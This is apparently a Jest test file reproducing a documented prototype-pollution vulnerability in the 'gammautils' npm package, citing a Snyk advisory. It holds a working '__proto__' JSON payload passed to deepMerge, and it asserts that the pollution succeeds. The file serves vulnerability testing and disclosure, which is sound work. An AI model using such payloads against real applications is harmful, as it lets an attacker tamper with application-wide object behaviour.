//https://snyk.io/vuln/SNYK-JS-GAMMAUTILS-598670
test("prototype pollution in gammautils", () => {
  expect({}.polluted).toBe(undefined);

  const gammautils = require("gammautils");
  var payload = JSON.parse('{"__proto__":{"polluted":"yes"}}');
  gammautils.object.deepMerge({}, payload);

  expect({}.polluted).toBe("yes");
});
